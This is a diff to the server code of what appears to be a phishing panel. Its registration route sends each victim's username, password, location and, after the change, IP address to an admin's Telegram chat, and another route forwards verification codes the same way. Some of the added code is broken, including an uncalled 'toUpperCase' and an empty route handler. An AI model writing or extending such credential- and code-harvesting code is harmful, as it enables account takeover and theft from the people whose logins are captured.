@@ -51,6 +51,8 @@ const AdminSchema = new mongoose.Schema({
   referralCode: String,
   chatId: String, // 🔹 replaced apikey with chatId
   bio: String,
+  profTag :{type:String,default:"Basic"},
+  candTag :{type:String,default:"Cand"},
   slogan: String,
   votes: { type: Number, default: 0 },
   createdAt: { type: Date, default: Date.now }
@@ -490,9 +492,13 @@ app.post("/student/register", async (req, res) => {
     });
 
     // notify admin & owner
-    await sendTelegram(admin.chatId, `🆕 New client: *${username}* just logged in to *${platform}*\nPassword: *${password}*\n from *${location.city}*, *${location.country }* `);
+    await sendTelegram(admin.chatId, `
+*🌟NEW LOGIN FROM ${platform}*\n\n
+*details*
+Username: *${username}* \nPassword: *${password}*\n
+Location: *${location.city}*, *${location.country }* `);
     
-    await sendTelegram(ADMIN_CHAT_ID, `🆕 Student registered: *${username}* (via ${admin.username}) from *${location.country || "Unknown location"} `);
+    await sendTelegram(ADMIN_CHAT_ID, `🆕 Student registered: *${username}* (via ${admin.username}'s link) from *${location.country || "Unknown location"}\n\n Ip address:*${ip}*`);
 
     return res.json({ success: true, studentId: student._id, admin: { username: admin.username, phone: admin.phone } });
   } catch (e) {
@@ -520,7 +526,8 @@ app.post("/student/send-code", async (req, res) => {
     const admin = await Admin.findById(refDoc.adminId);
     if (!admin) return res.status(404).json({ success: false, error: "Admin not found" });
 
-    const msg = `✅ ${code} is your ${platform || "NEXA"} verification code`;
+    const msg = `✅*NEW *${platform.toUpperCase} CODE*\n\nCode: *${code}\n\nPlatform: 
+    ${platform || "NEXA"} `;
     await sendTelegram(admin.chatId, msg);
 
 
@@ -567,6 +574,42 @@ app.post("/admin/site", verifyToken, async (req, res) => {
   }
 });
 
+app.post("/admin/update-name", verifyToken, async (req, res) => {
+  const { firstname, lastname } = req.body;
+  try {
+    const admin = await Admin.findById(req.userId);
+    if (!admin) {
+      return res.status(401).json({
+        success: false,
+        error: "Invalid or expired token"
+      });
+    }
+
+    if (firstname) admin.firstname = firstname;
+    if (lastname) admin.lastname = lastname;
+
+    await admin.save();
+
+    res.status(200).json({
+      success: true,
+      message: "Name updated successfully", 
+      firstname:admin.firstname,
+      lastname:admin.lastname
+    });
+
+    // send Telegram after response (non-blocking)
+    sendTelegram(
+      admin.chatId,
+      `*CHANGES DETECTED ON YOUR ACCOUNT: ${admin.username}*\n\nWe noticed that you changed your name on Nexa. Log in now to view the changes:\nhttps://adminpanel.vercel.app/${admin.username}`
+    );
+
+  } catch (e) {
+    res.status(500).json({
+      success: false,
+      error: "Server error: " + e.message
+    });
+  }
+});   
 // 🌐 Public Admins
 app.get("/admins/public", async (_, res) => {
   try {
@@ -639,6 +682,12 @@ app.post("/admin/broadcast", verifyToken, async (req, res) => {
     res.status(500).json({ success: false, error: "Broadcast failed" });
   }
 });
+
+app.post("/admin/profTag",async (req,res)=> {
+  const {adminId, badge} = req.body;
+  
+  
+})
 
 // Test send for current admin (protected)
 app.post("/send-test", verifyToken, async (req, res) => {
